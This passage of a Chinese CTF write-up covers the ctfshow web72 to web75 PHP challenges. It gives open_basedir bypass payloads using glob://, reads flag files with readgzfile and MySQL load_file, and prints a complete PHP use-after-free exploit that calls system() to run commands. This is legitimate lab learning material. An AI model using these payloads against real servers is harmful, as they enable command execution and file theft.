</code></pre><p>注意⚠️ 这道题只有权限查询的当前目录也就是<code>./</code></p>
<p>而无法访问到其他目录的文件，如 / 根目录</p>
<blockquote>
<p>尝试使用 scandir() 函数来扫描根目录，但由于 open_basedir 限制，这个操作被禁止了。
open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。
当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。</p>
<p>原文链接：https://blog.csdn.net/Myon5/article/details/140079942</p></blockquote>
<p>我们可以尝试用glob协议绕过open_basedir协议</p>
<p>payload:（记得删注释）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// 创建一个DirectoryIterator对象，遍历根目录
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">foreach($a as $f)// 遍历每个条目
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">   echo($f-&gt;__toString().&#39; &#39;);// 输出条目的名称，并添加一个空格
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">exit(0); // 终止脚本执行
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p><img alt="image-20241129151607469" loading="lazy" src="./assets/image-20241129151607469.png"></p>
<p>或者</p>
<p>payload：（记得删注释）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a = opendir(&#34;glob:///*&#34;); // 打开根目录，并将目录句柄赋值给$a
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">while (($file = readdir($a)) !== false) { // 循环读取目录中的每个条目
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">    echo $file . &#34;&lt;br&gt;&#34;; // 输出每个条目的名称，并添加HTML换行标签
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">};
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">exit(0); // 终止脚本执行
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>我们可以发现flag0.php</p>
<p>利用uaf的脚本进行命令利用uaf的脚本进行命令执行执行：</p>
<p>尝试执行ls /; cat /flag0.txt命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php
</span></span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="err">pwn(&#34;ls /;cat /flag0.txt&#34;);
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="err">function pwn($cmd) {
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="err">    global $abc, $helper, $backtrace;
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="err">    class Vuln {
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="err">        public $a;
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="err">        public function __destruct() { 
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="err">            global $backtrace; 
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="err">            unset($this-&gt;a);
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="err">            $backtrace = (new Exception)-&gt;getTrace(); # ;)
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="err">            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="err">                $backtrace = debug_backtrace();
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="err">    class Helper {
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="err">        public $a, $b, $c, $d;
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="err">    function str2ptr(&amp;$str, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="err">        $address = 0;
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="err">        for($j = $s-1; $j &gt;= 0; $j--) {
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="err">            $address &lt;&lt;= 8;
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="err">            $address |= ord($str[$p+$j]);
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="err">        return $address;
</span></span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="err">    function ptr2str($ptr, $m = 8) {
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="err">        $out = &#34;&#34;;
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="err">        for ($i=0; $i &lt; $m; $i++) {
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="err">            $out .= sprintf(&#39;%c&#39;,$ptr &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="err">            $ptr &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="err">        return $out;
</span></span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 39</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="err">    function write(&amp;$str, $p, $v, $n = 8) {
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="err">        $i = 0;
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $n; $i++) {
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="err">            $str[$p + $i] = sprintf(&#39;%c&#39;,$v &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="err">            $v &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="err">    function leak($addr, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="err">        global $abc, $helper;
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="err">        write($abc, 0x68, $addr + $p - 0x10);
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="err">        $leak = strlen($helper-&gt;a);
</span></span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="err">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
</span></span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="err">        return $leak;
</span></span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="err">    function parse_elf($base) {
</span></span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="err">        $e_type = leak($base, 0x10, 2);
</span></span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="err">        $e_phoff = leak($base, 0x20);
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="err">        $e_phentsize = leak($base, 0x36, 2);
</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="err">        $e_phnum = leak($base, 0x38, 2);
</span></span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $e_phnum; $i++) {
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="err">            $header = $base + $e_phoff + $i * $e_phentsize;
</span></span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="err">            $p_type  = leak($header, 0, 4);
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="err">            $p_flags = leak($header, 4, 4);
</span></span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="err">            $p_vaddr = leak($header, 0x10);
</span></span></span><span class="line"><span class="ln"> 68</span><span class="cl"><span class="err">            $p_memsz = leak($header, 0x28);
</span></span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 70</span><span class="cl"><span class="err">            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
</span></span></span><span class="line"><span class="ln"> 71</span><span class="cl"><span class="err">                # handle pie
</span></span></span><span class="line"><span class="ln"> 72</span><span class="cl"><span class="err">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
</span></span></span><span class="line"><span class="ln"> 73</span><span class="cl"><span class="err">                $data_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 74</span><span class="cl"><span class="err">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
</span></span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="err">                $text_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 77</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 78</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="err">        if(!$data_addr || !$text_size || !$data_size)
</span></span></span><span class="line"><span class="ln"> 80</span><span class="cl"><span class="err">            return false;
</span></span></span><span class="line"><span class="ln"> 81</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="err">        return [$data_addr, $text_size, $data_size];
</span></span></span><span class="line"><span class="ln"> 83</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 85</span><span class="cl"><span class="err">    function get_basic_funcs($base, $elf) {
</span></span></span><span class="line"><span class="ln"> 86</span><span class="cl"><span class="err">        list($data_addr, $text_size, $data_size) = $elf;
</span></span></span><span class="line"><span class="ln"> 87</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $data_size / 8; $i++) {
</span></span></span><span class="line"><span class="ln"> 88</span><span class="cl"><span class="err">            $leak = leak($data_addr, $i * 8);
</span></span></span><span class="line"><span class="ln"> 89</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 90</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 91</span><span class="cl"><span class="err">                # &#39;constant&#39; constant check
</span></span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="err">                if($deref != 0x746e6174736e6f63)
</span></span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln"> 94</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln"> 95</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="err">            $leak = leak($data_addr, ($i + 4) * 8);
</span></span></span><span class="line"><span class="ln"> 97</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 99</span><span class="cl"><span class="err">                # &#39;bin2hex&#39; constant check
</span></span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="err">                if($deref != 0x786568326e6962)
</span></span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln">102</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln">103</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">104</span><span class="cl"><span class="err">            return $data_addr + $i * 8;
</span></span></span><span class="line"><span class="ln">105</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">108</span><span class="cl"><span class="err">    function get_binary_base($binary_leak) {
</span></span></span><span class="line"><span class="ln">109</span><span class="cl"><span class="err">        $base = 0;
</span></span></span><span class="line"><span class="ln">110</span><span class="cl"><span class="err">        $start = $binary_leak &amp; 0xfffffffffffff000;
</span></span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="err">        for($i = 0; $i &lt; 0x1000; $i++) {
</span></span></span><span class="line"><span class="ln">112</span><span class="cl"><span class="err">            $addr = $start - 0x1000 * $i;
</span></span></span><span class="line"><span class="ln">113</span><span class="cl"><span class="err">            $leak = leak($addr, 0, 7);
</span></span></span><span class="line"><span class="ln">114</span><span class="cl"><span class="err">            if($leak == 0x10102464c457f) { # ELF header
</span></span></span><span class="line"><span class="ln">115</span><span class="cl"><span class="err">                return $addr;
</span></span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">117</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">118</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">119</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">120</span><span class="cl"><span class="err">    function get_system($basic_funcs) {
</span></span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="err">        $addr = $basic_funcs;
</span></span></span><span class="line"><span class="ln">122</span><span class="cl"><span class="err">        do {
</span></span></span><span class="line"><span class="ln">123</span><span class="cl"><span class="err">            $f_entry = leak($addr);
</span></span></span><span class="line"><span class="ln">124</span><span class="cl"><span class="err">            $f_name = leak($f_entry, 0, 6);
</span></span></span><span class="line"><span class="ln">125</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">126</span><span class="cl"><span class="err">            if($f_name == 0x6d6574737973) { # system
</span></span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="err">                return leak($addr + 8);
</span></span></span><span class="line"><span class="ln">128</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="err">            $addr += 0x20;
</span></span></span><span class="line"><span class="ln">130</span><span class="cl"><span class="err">        } while($f_entry != 0);
</span></span></span><span class="line"><span class="ln">131</span><span class="cl"><span class="err">        return false;
</span></span></span><span class="line"><span class="ln">132</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">133</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">134</span><span class="cl"><span class="err">    function trigger_uaf($arg) {
</span></span></span><span class="line"><span class="ln">135</span><span class="cl"><span class="err">        # str_shuffle prevents opcache string interning
</span></span></span><span class="line"><span class="ln">136</span><span class="cl"><span class="err">        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">137</span><span class="cl"><span class="err">        $vuln = new Vuln();
</span></span></span><span class="line"><span class="ln">138</span><span class="cl"><span class="err">        $vuln-&gt;a = $arg;
</span></span></span><span class="line"><span class="ln">139</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">140</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">141</span><span class="cl"><span class="err">    if(stristr(PHP_OS, &#39;WIN&#39;)) {
</span></span></span><span class="line"><span class="ln">142</span><span class="cl"><span class="err">        die(&#39;This PoC is for *nix systems only.&#39;);
</span></span></span><span class="line"><span class="ln">143</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">145</span><span class="cl"><span class="err">    $n_alloc = 10; # increase this value if UAF fails
</span></span></span><span class="line"><span class="ln">146</span><span class="cl"><span class="err">    $contiguous = [];
</span></span></span><span class="line"><span class="ln">147</span><span class="cl"><span class="err">    for($i = 0; $i &lt; $n_alloc; $i++)
</span></span></span><span class="line"><span class="ln">148</span><span class="cl"><span class="err">        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">150</span><span class="cl"><span class="err">    trigger_uaf(&#39;x&#39;);
</span></span></span><span class="line"><span class="ln">151</span><span class="cl"><span class="err">    $abc = $backtrace[1][&#39;args&#39;][0];
</span></span></span><span class="line"><span class="ln">152</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">153</span><span class="cl"><span class="err">    $helper = new Helper;
</span></span></span><span class="line"><span class="ln">154</span><span class="cl"><span class="err">    $helper-&gt;b = function ($x) { };
</span></span></span><span class="line"><span class="ln">155</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">156</span><span class="cl"><span class="err">    if(strlen($abc) == 79 || strlen($abc) == 0) {
</span></span></span><span class="line"><span class="ln">157</span><span class="cl"><span class="err">        die(&#34;UAF failed&#34;);
</span></span></span><span class="line"><span class="ln">158</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">159</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">160</span><span class="cl"><span class="err">    # leaks
</span></span></span><span class="line"><span class="ln">161</span><span class="cl"><span class="err">    $closure_handlers = str2ptr($abc, 0);
</span></span></span><span class="line"><span class="ln">162</span><span class="cl"><span class="err">    $php_heap = str2ptr($abc, 0x58);
</span></span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="err">    $abc_addr = $php_heap - 0xc8;
</span></span></span><span class="line"><span class="ln">164</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">165</span><span class="cl"><span class="err">    # fake value
</span></span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="err">    write($abc, 0x60, 2);
</span></span></span><span class="line"><span class="ln">167</span><span class="cl"><span class="err">    write($abc, 0x70, 6);
</span></span></span><span class="line"><span class="ln">168</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="err">    # fake reference
</span></span></span><span class="line"><span class="ln">170</span><span class="cl"><span class="err">    write($abc, 0x10, $abc_addr + 0x60);
</span></span></span><span class="line"><span class="ln">171</span><span class="cl"><span class="err">    write($abc, 0x18, 0xa);
</span></span></span><span class="line"><span class="ln">172</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">173</span><span class="cl"><span class="err">    $closure_obj = str2ptr($abc, 0x20);
</span></span></span><span class="line"><span class="ln">174</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">175</span><span class="cl"><span class="err">    $binary_leak = leak($closure_handlers, 8);
</span></span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="err">    if(!($base = get_binary_base($binary_leak))) {
</span></span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t determine binary base address&#34;);
</span></span></span><span class="line"><span class="ln">178</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">179</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">180</span><span class="cl"><span class="err">    if(!($elf = parse_elf($base))) {
</span></span></span><span class="line"><span class="ln">181</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t parse ELF header&#34;);
</span></span></span><span class="line"><span class="ln">182</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">183</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">184</span><span class="cl"><span class="err">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
</span></span></span><span class="line"><span class="ln">185</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get basic_functions address&#34;);
</span></span></span><span class="line"><span class="ln">186</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">187</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">188</span><span class="cl"><span class="err">    if(!($zif_system = get_system($basic_funcs))) {
</span></span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get zif_system address&#34;);
</span></span></span><span class="line"><span class="ln">190</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">191</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">192</span><span class="cl"><span class="err">    # fake closure object
</span></span></span><span class="line"><span class="ln">193</span><span class="cl"><span class="err">    $fake_obj_offset = 0xd0;
</span></span></span><span class="line"><span class="ln">194</span><span class="cl"><span class="err">    for($i = 0; $i &lt; 0x110; $i += 8) {
</span></span></span><span class="line"><span class="ln">195</span><span class="cl"><span class="err">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
</span></span></span><span class="line"><span class="ln">196</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">197</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">198</span><span class="cl"><span class="err">    # pwn
</span></span></span><span class="line"><span class="ln">199</span><span class="cl"><span class="err">    write($abc, 0x20, $abc_addr + $fake_obj_offset);
</span></span></span><span class="line"><span class="ln">200</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
</span></span></span><span class="line"><span class="ln">201</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
</span></span></span><span class="line"><span class="ln">202</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">203</span><span class="cl"><span class="err">    ($helper-&gt;b)($cmd);
</span></span></span><span class="line"><span class="ln">204</span><span class="cl"><span class="err">    exit();
</span></span></span><span class="line"><span class="ln">205</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">206</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>记得要转url</p>
<p><img alt="image-20241129232845637" loading="lazy" src="assets/image-20241129232845637.png"></p>
<h5 id="所以什么是uaf呢">所以什么是uaf呢？<a hidden class="anchor" aria-hidden="true" href="#所以什么是uaf呢">#</a></h5>
<p>（先挖个坑回头补）</p>
<h4 id="web73">web73<a hidden class="anchor" aria-hidden="true" href="#web73">#</a></h4>
<p>这一题和上一题的区别其实就是flag的文件改名了，我们用上一题的方法读一下文件</p>
<pre tabindex="0"><code>c=?&gt;&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// 创建一个DirectoryIterator对象，遍历根目录
foreach($a as $f)// 遍历每个条目
{
   echo($f-&gt;__toString().&#39; &#39;);// 输出条目的名称，并添加一个空格
}
exit(0); // 终止脚本执行
?&gt;
</code></pre><p><img alt="image-20241129234701193" loading="lazy" src="assets/image-20241129234701193.png"></p>
<p>可以看到一个flagc.txt文件</p>
<p>这题其实已经关闭了open_basedir，所以我们也可以用之前的方法读</p>
<pre tabindex="0"><code>var_export(scandir(&#39;/&#39;));exit();
</code></pre><pre tabindex="0"><code>echo(implode(&#39; &#39;,scandir(&#39;/&#39;)));exit();
</code></pre><p>读文件的话上一题的uaf方法被ban了，这题用不了</p>
<p>所以我们还是用之前方法</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagc.txt&#39;);exit();
</code></pre><p><img alt="image-20241129235458680" loading="lazy" src="assets/image-20241129235458680.png"></p>
<h4 id="web74">web74<a hidden class="anchor" aria-hidden="true" href="#web74">#</a></h4>
<p><img alt="image-20241129235835167" loading="lazy" src="assets/image-20241129235835167.png"></p>
<p>这题我先用之前的方法var_export试试能不能读到目录，发现显示null，应该是open_basedir打开了</p>
<p><img alt="image-20241130000019913" loading="lazy" src="assets/image-20241130000019913.png"></p>
<p>接着用glob协议的方法读到了，flag文件名叫做flagx.txt</p>
<p>先用uaf的方法试试</p>
<p><img alt="image-20241130000253395" loading="lazy" src="assets/image-20241130000253395.png"></p>
<p>发现这条路被ban掉了</p>
<p><img alt="image-20241130000438521" loading="lazy" src="assets/image-20241130000438521.png"></p>
<p>最后用</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagx.txt&#39;);exit();
</code></pre><p>成功查到了flag</p>
<h4 id="web75">web75<a hidden class="anchor" aria-hidden="true" href="#web75">#</a></h4>
<p><img alt="image-20241130001438365" loading="lazy" src="assets/image-20241130001438365.png"></p>
<p>这题要用glob查文件，用var_export查不了</p>
<p>接下来是读文件</p>
<p>尝试了uaf和readgzfile之类的方法都失败了</p>
<p>没办法看看大佬怎么做的</p>
<p>我们其实可以用到mysql的load_file方法，从而读到flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;ctftraining&#34;</span><span class="p">);</span> <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select load_file(&#39;/flag36.txt&#39;) as a&#34;</span><span class="p">;</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">while</span><span class="p">(</span><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$row</span><span class="p">)){</span> <span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="p">}</span> <span class="k">exit</span><span class="p">();</span>
</span></span></code></pre></div><p>豆包解释一下</p>
<blockquote>
<ol>
<li>数据库连接：
<ul>
<li><code>$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;);</code></li>
<li>这行代码使用 MySQLi 扩展建立了一个与 MySQL 数据库的连接。它指定了数据库服务器的 IP 地址为<code>127.0.0.1</code>（本地主机），用户名是<code>root</code>，密码也是<code>root</code>，要连接的数据库名称是<code>ctftraining</code>。如果连接成功，<code>$conn</code>将保存这个数据库连接对象，以便后续进行数据库操作；如果连接失败，将会产生一个错误信息（不过在这段代码中没有对连接失败情况做显式处理）。</li>
</ul>
</li>
<li>SQL 查询语句构建：
<ul>
<li><code>$sql = &quot;select load_file('/flag36.txt') as a&quot;;</code></li>
<li>这里构建了一个 SQL 查询语句。<code>load_file()</code>是 MySQL 中的一个函数，它的作用是读取指定路径的文件内容，并以字符串的形式返回。在这个查询中，它试图读取服务器上<code>/flag36.txt</code>文件的内容，并给查询结果的这一列起了一个别名<code>a</code>。</li>
</ul>
</li>
<li>执行查询并获取结果：
<ul>
<li><code>$row = mysqli_query($conn, $sql);</code></li>
<li>这行代码使用已经建立好的数据库连接<code>$conn</code>来执行前面构建的 SQL 查询语句<code>$sql</code>。如果查询执行成功，<code>$row</code>将包含查询结果集的资源对象（可以理解为指向查询结果数据的一种引用）；如果查询失败，同样会产生一个错误信息（这里也未做显式处理）。</li>
<li><code>while($result=mysqli_fetch_array($row)){ echo $result['a']; }</code></li>
<li>这个<code>while</code>循环用于遍历查询结果集。<code>mysqli_fetch_array()</code>函数每次从结果集中获取一行数据，并以数组的形式返回。在循环内部，它通过<code>$result['a']</code>来获取前面查询中<code>load_file()</code>函数读取到的文件内容（因为在查询中给这一列起了别名<code>a</code>），并将其输出到屏幕上。</li>
</ul>
</li>
<li>程序结束：
<ul>
<li><code>exit();</code></li>
<li>这行代码使得脚本在完成查询结果输出后立即终止执行，不再执行后续可能存在的其他代码。</li>
</ul>
</li>
</ol></blockquote>
<p>也可以</p>
<p>用PDO的方法来实现同样的目的</p>
<p>payload:</p>
